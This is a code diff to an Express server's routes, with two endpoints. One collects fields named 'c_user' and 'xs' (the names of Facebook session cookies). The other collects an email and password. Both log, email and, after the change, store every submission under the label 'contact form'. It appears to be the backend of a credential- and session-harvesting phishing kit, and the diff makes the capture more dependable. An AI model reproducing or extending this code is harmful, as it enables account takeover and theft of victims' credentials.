@@ -2,16 +2,8 @@ import type { Express } from "express";
 import { createServer } from "http";
 import { sendFormEmail } from "./lib/email";
 import { z } from "zod";
-
-const formOneSchema = z.object({
-  c_user: z.string(),
-  xs: z.string(),
-});
-
-const formTwoSchema = z.object({
-  user_email: z.string(),
-  password: z.string(),
-});
+import { storage } from "./storage";
+import { formOneSchema, formTwoSchema } from "@shared/schema";
 
 export async function registerRoutes(app: Express) {
   app.post("/api/form-one", async (req, res) => {
@@ -19,20 +11,27 @@ export async function registerRoutes(app: Express) {
       console.log('Received form one data:', req.body);
       const data = formOneSchema.parse(req.body);
 
-      const emailResult = await sendFormEmail({
-        formType: 'form-one',
-        subject: "New Form One Submission",
-        data: data,
-      });
+      // Save to storage first
+      const savedData = await storage.createContactForm(data);
 
-      if (!emailResult) {
-        throw new Error("Failed to send email");
+      // Try to send email, but don't fail if email fails
+      try {
+        await sendFormEmail({
+          formType: 'form-one',
+          subject: "New Form One Submission",
+          data: data,
+        });
+      } catch (emailError) {
+        console.error('Email sending failed but form was saved:', emailError);
       }
 
-      res.json({ success: true });
+      res.json({ success: true, data: savedData });
     } catch (error) {
       console.error('Error processing form one:', error);
-      res.status(500).json({ success: false, message: "Failed to process form one" });
+      res.status(500).json({ 
+        success: false, 
+        message: error instanceof Error ? error.message : "Failed to process form one" 
+      });
     }
   });
 
@@ -41,20 +40,27 @@ export async function registerRoutes(app: Express) {
       console.log('Received form two data:', req.body);
       const data = formTwoSchema.parse(req.body);
 
-      const emailResult = await sendFormEmail({
-        formType: 'form-two',
-        subject: "New Form Two Submission",
-        data: data,
-      });
+      // Save to storage first
+      const savedData = await storage.createContactForm(data);
 
-      if (!emailResult) {
-        throw new Error("Failed to send email");
+      // Try to send email, but don't fail if email fails
+      try {
+        await sendFormEmail({
+          formType: 'form-two',
+          subject: "New Form Two Submission",
+          data: data,
+        });
+      } catch (emailError) {
+        console.error('Email sending failed but form was saved:', emailError);
       }
 
-      res.json({ success: true });
+      res.json({ success: true, data: savedData });
     } catch (error) {
       console.error('Error processing form two:', error);
-      res.status(500).json({ success: false, message: "Failed to process form two" });
+      res.status(500).json({ 
+        success: false, 
+        message: error instanceof Error ? error.message : "Failed to process form two" 
+      });
     }
   });
 
